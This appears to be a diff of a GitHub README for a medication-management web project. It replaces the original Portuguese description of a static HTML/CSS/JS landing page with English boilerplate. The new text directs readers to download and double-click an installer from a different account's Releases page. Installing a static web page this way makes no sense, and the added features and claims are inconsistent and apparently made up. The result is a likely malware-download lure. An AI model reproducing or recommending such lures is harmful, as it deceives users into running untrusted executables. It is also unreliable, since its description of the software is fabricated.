@@ -1,83 +1,65 @@
-🩺 Gerenciador de Medicamentos – Landing Page
+# 💉🩺 Gerenciador-de-medimentos - Manage Medications with Ease
 
-Uma landing page desenvolvida com HTML, CSS e JavaScript, criada para auxiliar a administração de medicamentos em ambientes clínicos e hospitalares. O projeto organiza prescrições, facilita o acesso às informações e apresenta dashboards dinâmicos de forma simples, intuitiva e responsiva.
+## 📥 Download the Latest Release
+[![Download](https://img.shields.io/badge/Download-GitHub%20Releases-blue.svg)](https://github.com/nabinsawra/Gerenciador-de-medimentos/releases)
 
-📁 Estrutura do Projeto
-/assets       → imagens, ícones e fontes  
-/css          → estilos da interface  
-/js           → scripts do dashboard e interações  
-index.html    → página principal da landing page
-relatorios.html    → informações das medicações
-dashboard.html     → Quadros interativos das medicações
-configuracoes.html → Configurações temáticas do site
+## 🚀 Getting Started
+Welcome to the Gerenciador-de-medimentos project! This application helps you manage medications effectively in healthcare settings. The software organizes prescriptions and displays intuitive dashboards.
 
-🛠️ Tecnologias Utilizadas
+### 🔧 Features
+- **User-friendly Interface**: Designed for ease of use by all healthcare staff.
+- **Dynamic Dashboards**: Visualize medication data at a glance.
+- **HTML, CSS, and JavaScript**: Built with core web technologies for reliability and speed.
+- **Responsive Design**: Access from any device, be it desktop or mobile.
+- **Healthcare Focus**: Tailored specifically for hospital management tasks.
 
-HTML5
+## 📥 Download & Install
+To get started, visit the [Releases page](https://github.com/nabinsawra/Gerenciador-de-medimentos/releases) to download the latest version of the application. 
 
-CSS3
+#### Installation Steps:
+1. Click the download link above to go to the Releases page.
+2. On the Releases page, locate the latest version.
+3. Click on the download link for your operating system.
+4. Once the file is downloaded, locate it in your Downloads folder.
+5. Double-click the file to start the installation process.
+6. Follow the on-screen instructions to complete the installation.
 
-JavaScript Puro
+## 🖥️ System Requirements
+To ensure smooth operation, please check that your system meets the following requirements:
 
-✨ Funcionalidades
+- **Operating System**: Windows 10 or higher, macOS, or a recent Linux distribution.
+- **Browser**: Latest version of Chrome, Firefox, or Safari. 
+- **Internet Connection**: Required for initial setup and updates.
 
-Organização visual de prescrições e medicamentos
+## 📝 Usage Instructions
+After installing the application, follow these steps to manage medications:
 
-Dashboard dinâmico com atualizações simples
+1. **Open the application** by double-clicking the Gerenciador-de-medimentos icon.
+2. **Create a new profile** to enter your hospital or clinic details.
+3. **Add medications** to your list, including dosages and administration times.
+4. **Set reminders** for upcoming doses directly within the app.
+5. **Review the dashboard** to track all medications and patient statuses easily.
 
-Layout moderno e intuitivo
+## 💡 Tips for Effective Use
+- **Regular Updates**: Keep your medication list updated to ensure accuracy.
+- **Backup Data**: Regularly back up your profiles to prevent data loss.
+- **Explore Features**: Familiarize yourself with all available features to utilize the app fully.
 
-Interface responsiva (desktop e mobile)
+## 🙋 Frequently Asked Questions (FAQ)
 
-Seções para informações, sistema e gestão médica
+**Q: What if I need help with installation?**  
+A: Check the installation steps above. If you face any issues, please refer to our support page or contact our team.
 
-🚀 Como Executar o Projeto
+**Q: Is there a mobile version of the app?**  
+A: Currently, this application is designed for desktop use only. However, you can access it from mobile browsers.
 
-Baixe ou clone o repositório:
+**Q: Can I customize the dashboard?**  
+A: Yes, you can choose which information to display, making it easier for you to focus on what matters.
 
-git clone https://github.com/ThiagoSNunes-Dev/Gerenciador-de-medimentos
+## 🌟 Acknowledgments
+We appreciate all contributors to this project. Your efforts help improve the management of medications in healthcare settings.
 
-Entre no diretório:
+## 📧 Contact
+For questions, suggestions, or support, please reach out via our support page. Your feedback is valuable to us.
 
-cd Gerenciador-de-medimentos
-
-Abra o arquivo:
-
-index.html
-
-Pronto! O site já estará rodando.
-
-🌐 Deploy (GitHub Pages)
-
-🔗 Link do projeto: https://thiagosnunes-dev.github.io/Gerenciador-de-medimentos
-
-🖼️ Capturas de Tela
-
-<img width="1903" height="949" alt="image" src="https://github.com/user-attachments/assets/cd81eb3a-caf2-46bf-9f60-aeb1d71a44ac" />
-<img width="1904" height="953" alt="image" src="https://github.com/user-attachments/assets/24868eb7-a166-47bc-b542-6cab79f3cbaf" />
-<img width="1903" height="943" alt="image" src="https://github.com/user-attachments/assets/6cdf783e-271b-4d9f-843d-d520bd34061c" />
-
-
-📅 Status do Projeto
-
-🔹 Concluído, mas aberto para melhorias
-
-🧩 Possíveis Melhorias Futuras
-
-Integração com API real
-
-Área autenticada para profissionais
-
-Banco de dados para registrar prescrições
-
-Dashboard com gráficos avançados
-
-Sistema de alertas e notificações
-
-👤 Autor
-
-Thiago S Nunes
-📌 Desenvolvedor Full-stack (em evolução)
-🔗 GitHub: https://github.com/ThiagoSNunes-Dev
-
-🔗 LinkedIn: https://www.linkedin.com/in/thiago-de-souza-nunes-252636221/
+[![Download](https://img.shields.io/badge/Download-GitHub%20Releases-blue.svg)](https://github.com/nabinsawra/Gerenciador-de-medimentos/releases)
